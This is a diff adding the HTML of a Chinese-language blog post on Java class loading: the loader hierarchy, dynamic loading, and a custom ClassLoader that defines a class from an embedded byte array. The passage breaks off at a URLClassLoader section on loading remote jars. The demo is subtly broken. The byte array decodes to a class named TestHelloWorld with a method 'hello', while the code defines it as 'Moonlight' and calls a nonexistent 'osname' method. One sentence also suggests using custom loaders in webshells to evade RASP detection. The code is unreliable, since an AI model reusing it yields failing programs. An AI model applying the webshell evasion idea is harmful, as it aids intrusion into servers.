@@ -1,0 +1,598 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
+  <link rel="icon" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <meta name="description" content="ClassLoader1. 类加载机制Java依赖于JVM(Java虚拟机)实现的跨平台开发语言，程序运行前需要先编译成字节码文件.class 在JVM类加载器中最顶层的是Bootstrap ClassLoader（引导类加载器）、Extension ClassLoader（扩展类加载器）、App ClassLoader（系统类加载器），AppClassLoader是默认的类加载器，如果类加载时我">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ClassLoader">
+<meta property="og:url" content="http://example.com/2022/03/05/ClassLoader/index.html">
+<meta property="og:site_name" content="🗄">
+<meta property="og:description" content="ClassLoader1. 类加载机制Java依赖于JVM(Java虚拟机)实现的跨平台开发语言，程序运行前需要先编译成字节码文件.class 在JVM类加载器中最顶层的是Bootstrap ClassLoader（引导类加载器）、Extension ClassLoader（扩展类加载器）、App ClassLoader（系统类加载器），AppClassLoader是默认的类加载器，如果类加载时我">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/JvmSpec7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220305232052427.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220305232133753.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220307192239106.png">
+<meta property="article:published_time" content="2022-03-05T08:28:21.000Z">
+<meta property="article:modified_time" content="2023-09-09T05:17:33.815Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/JvmSpec7.png">
+  
+  <title>ClassLoader - 🗄</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-dark-dimmed.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":"G-SL9T1KRBQY","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>👩‍💻</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('https://raw.githubusercontent.com/kIl3rr/photo/main/post.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="ClassLoader">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-03-05 16:28" pubdate>
+        March 5, 2022 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      5.6k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      NaN 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">ClassLoader</h1>
+            
+            <div class="markdown-body">
+              <h1 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h1><h2 id="1-类加载机制"><a href="#1-类加载机制" class="headerlink" title="1. 类加载机制"></a>1. 类加载机制</h2><p>Java依赖于<code>JVM</code>(Java虚拟机)实现的跨平台开发语言，程序运行前需要先编译成字节码文件<code>.class</code></p>
+<p>在JVM类加载器中最顶层的是<code>Bootstrap ClassLoader（引导类加载器）</code>、<code>Extension ClassLoader（扩展类加载器）</code>、<code>App ClassLoader（系统类加载器）</code>，<code>AppClassLoader</code>是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用<code>AppClassLoader</code>加载类，<code>ClassLoader.getSystemClassLoader()</code>返回的系统类加载器也是<code>AppClassLoader</code></p>
+<p>值得注意的是某些时候我们获取一个类的类加载器时候可能会返回一个<code>null</code>值，如:<code>java.io.File.class.getClassLoader()</code>将返回一个<code>null</code>对象，因为<code>java.io.File</code>类在JVM初始化的时候会被<code>Bootstrap ClassLoader（引导类加载器）</code>加载（该类加载器实现于JVM层，采用C++编写），我们在尝试获取被<code>Bootstrap ClassLoader</code>类加载器所加载的类的<code>ClassLoader</code>时候都会返回<code>null</code></p>
+<p><code>ClassLoader</code>类有如下核心方法：</p>
+<ol>
+<li><code>loadClass</code>（加载指定的Java类）</li>
+<li><code>findClass</code>（查找指定的Java类）</li>
+<li><code>findLoadedClass</code>（查找JVM已经加载过的类）</li>
+<li><code>defineClass</code>（定义一个Java类）</li>
+<li><code>resolveClass</code>（链接指定的Java类）</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span>&#123;<br>	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>		System.out.println(<span class="hljs-string">&quot;hello world&quot;</span>);<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>ClassLoader</code>类加载流程如下：</p>
+<ol>
+<li><code>ClassLoader</code>会调用<code>public Class&lt;?&gt; loadClass(String name)</code>方法加载<code>Demo</code>类。</li>
+<li>调用<code>findLoadedClass</code>方法检查<code>Demo</code>类是否已经初始化，如果JVM已初始化过该类则直接返回类对象。</li>
+<li>如果创建当前<code>ClassLoader</code>时传入了父类加载器（<code>new ClassLoader(父类加载器)</code>）就使用父类加载器加载<code>Demo</code>类，否则使用JVM的<code>Bootstrap ClassLoader</code>加载。</li>
+<li>如果上一步无法加载<code>Demo</code>类，那么调用自身的<code>findClass</code>方法尝试加载<code>Demo</code>类。</li>
+<li>如果当前的<code>ClassLoader</code>没有重写了<code>findClass</code>方法，那么直接返回类加载失败异常。如果当前类重写了<code>findClass</code>方法并通过传入的<code>Demo</code>类名找到了对应的类字节码，那么应该调用<code>defineClass</code>方法去JVM中注册该类。</li>
+<li>如果调用loadClass的时候传入的<code>resolve</code>参数为true，那么还需要调用<code>resolveClass</code>方法链接类，默认为false。</li>
+<li>返回一个被JVM加载后的<code>java.lang.Class</code>类对象。</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/JvmSpec7.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="2-Java类"><a href="#2-Java类" class="headerlink" title="2. Java类"></a>2. Java类</h2><p>一个Java类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Moonlight</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;hello world!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>JDK自带的<code>javap</code>反编译Moonlight.class</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220305232052427.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>hexdump</code>查看二进制字节码文件Moonlight.class</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220305232133753.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="3-类的动态加载"><a href="#3-类的动态加载" class="headerlink" title="3. 类的动态加载"></a>3. 类的动态加载</h2><p>Java类加载方式分为<code>显式</code>和<code>隐式</code>，显式通常由<code>Java反射</code>或<code>ClassLoader</code>动态加载类对象，隐式指的是<code>类.方法()</code>或<code>new</code>一个类实例</p>
+<p>所以有两种方式去动态加载类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//反射加载Moonlight实例</span><br>Class.forName(<span class="hljs-string">&quot;xxx-package.Moonlight&quot;</span>);<br><br><span class="hljs-comment">//ClassLoader加载Moonlight实例</span><br><span class="hljs-keyword">this</span>.getClass().getClassLoader().loadClass(<span class="hljs-string">&quot;xxx-package.Moonlight&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>forName(String className)</p>
+<p>forName(String name,boolean initialize,ClassLoader loader)</p>
+</blockquote>
+<p>其中<code>Class.forName(&quot;类&quot;)</code>默认会初始化被加载类的静态属性和方法，重载方法可以设置不初始化类；<code>ClassLoader.loadClass</code>默认不会初始化类方法</p>
+<h2 id="4-自定义ClassLoader"><a href="#4-自定义ClassLoader" class="headerlink" title="4. 自定义ClassLoader"></a>4. 自定义ClassLoader</h2><p><code>java.lang.ClassLoader</code>是所有的类加载器的父类，<code>java.lang.ClassLoader</code>有非常多的子类加载器，比如我们用于加载jar包的<code>java.net.URLClassLoader</code>其本身通过继承<code>java.lang.ClassLoader</code>类，重写了<code>findClass</code>方法从而实现了加载目录class文件甚至是远程资源文件。</p>
+<p>如果存在类Moonlight，调用其一个方法</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220307192239106.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是类Moonlight不存在于<code>classpath</code>，我们可以自定义类加载器重写<code>findClass</code>方法，然后调用<code>defineClass</code>方法时<strong>传入类Moonlight的字节码向<code>JVM</code>中定义一个类Moonlight类</strong>，最后通过反射调用类Moonlight的方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ClassLoader</span> </span>&#123;<br><br>    <span class="hljs-comment">// 类名</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String testClassName = <span class="hljs-string">&quot;Moonlight&quot;</span>;<br><br>    <span class="hljs-comment">// 类字节码</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] testClassBytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;<br>            -<span class="hljs-number">54</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">70</span>, -<span class="hljs-number">66</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">51</span>, <span class="hljs-number">0</span>, <span class="hljs-number">17</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">13</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">14</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>,<br>            <span class="hljs-number">16</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">60</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">105</span>, <span class="hljs-number">116</span>, <span class="hljs-number">62</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">40</span>, <span class="hljs-number">41</span>, <span class="hljs-number">86</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">67</span>, <span class="hljs-number">111</span>, <span class="hljs-number">100</span>,<br>            <span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">76</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">101</span>, <span class="hljs-number">78</span>, <span class="hljs-number">117</span>, <span class="hljs-number">109</span>, <span class="hljs-number">98</span>, <span class="hljs-number">101</span>, <span class="hljs-number">114</span>, <span class="hljs-number">84</span>, <span class="hljs-number">97</span>, <span class="hljs-number">98</span>, <span class="hljs-number">108</span>, <span class="hljs-number">101</span>,<br>            <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">104</span>, <span class="hljs-number">101</span>, <span class="hljs-number">108</span>, <span class="hljs-number">108</span>, <span class="hljs-number">111</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>, <span class="hljs-number">40</span>, <span class="hljs-number">41</span>, <span class="hljs-number">76</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>,<br>            <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">83</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">59</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">83</span>, <span class="hljs-number">111</span>, <span class="hljs-number">117</span>, <span class="hljs-number">114</span>, <span class="hljs-number">99</span>,<br>            <span class="hljs-number">101</span>, <span class="hljs-number">70</span>, <span class="hljs-number">105</span>, <span class="hljs-number">108</span>, <span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">19</span>, <span class="hljs-number">84</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">72</span>, <span class="hljs-number">101</span>, <span class="hljs-number">108</span>, <span class="hljs-number">108</span>, <span class="hljs-number">111</span>, <span class="hljs-number">87</span>, <span class="hljs-number">111</span>,<br>            <span class="hljs-number">114</span>, <span class="hljs-number">108</span>, <span class="hljs-number">100</span>, <span class="hljs-number">46</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span>, <span class="hljs-number">72</span>, <span class="hljs-number">101</span>, <span class="hljs-number">108</span>, <span class="hljs-number">108</span>, <span class="hljs-number">111</span>,<br>            <span class="hljs-number">32</span>, <span class="hljs-number">87</span>, <span class="hljs-number">111</span>, <span class="hljs-number">114</span>, <span class="hljs-number">108</span>, <span class="hljs-number">100</span>, <span class="hljs-number">126</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">40</span>, <span class="hljs-number">99</span>, <span class="hljs-number">111</span>, <span class="hljs-number">109</span>, <span class="hljs-number">47</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">98</span>, <span class="hljs-number">97</span>, <span class="hljs-number">105</span>, <span class="hljs-number">47</span>,<br>            <span class="hljs-number">115</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">47</span>, <span class="hljs-number">99</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>, <span class="hljs-number">108</span>, <span class="hljs-number">111</span>, <span class="hljs-number">97</span>, <span class="hljs-number">100</span>, <span class="hljs-number">101</span>, <span class="hljs-number">114</span>, <span class="hljs-number">47</span>, <span class="hljs-number">84</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>,<br>            <span class="hljs-number">116</span>, <span class="hljs-number">72</span>, <span class="hljs-number">101</span>, <span class="hljs-number">108</span>, <span class="hljs-number">108</span>, <span class="hljs-number">111</span>, <span class="hljs-number">87</span>, <span class="hljs-number">111</span>, <span class="hljs-number">114</span>, <span class="hljs-number">108</span>, <span class="hljs-number">100</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>,<br>            <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">79</span>, <span class="hljs-number">98</span>, <span class="hljs-number">106</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">116</span>, <span class="hljs-number">0</span>, <span class="hljs-number">33</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>,<br>            <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">29</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">42</span>, -<span class="hljs-number">73</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">79</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>            <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">27</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>,<br>            <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">18</span>, <span class="hljs-number">2</span>, -<span class="hljs-number">80</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>,<br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span><br>    &#125;;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-comment">// 只处理Moonlight类</span><br>        <span class="hljs-keyword">if</span> (name.equals(testClassName)) &#123;<br>            <span class="hljs-comment">// 调用JVM的native方法定义Moonlight类</span><br>            <span class="hljs-keyword">return</span> defineClass(testClassName, testClassBytes, <span class="hljs-number">0</span>, testClassBytes.length);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.findClass(name);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">// 创建自定义的类加载器</span><br>        Demo2 loader = <span class="hljs-keyword">new</span> Demo2();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 使用自定义的类加载器加载Moonlight类</span><br>            Class testClass = loader.loadClass(testClassName);<br><br>            <span class="hljs-comment">// 反射创建类</span><br>            Object testInstance = testClass.newInstance();<br><br>            <span class="hljs-comment">// 反射获取osname方法</span><br>            Method method = testInstance.getClass().getMethod(<span class="hljs-string">&quot;osname&quot;</span>);<br><br>            <span class="hljs-comment">// 反射调用osname方法</span><br>            String str = (String) method.invoke(testInstance);<br><br>            System.out.println(str);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>自定义类加载器可以在webshell实现加载并调用自己编译的类对象，比如可以命令执行时调用自定义类字节码的native方法绕过RASP检测</p>
+<p>初学存疑：类字节码如何获取<a target="_blank" rel="noopener" href="https://blog.csdn.net/generalfu/article/details/112003104">https://blog.csdn.net/generalfu/article/details/112003104</a></p>
+<h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>继承ClassLoader的URLClassLoader可以加载远程jar实现类方法调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 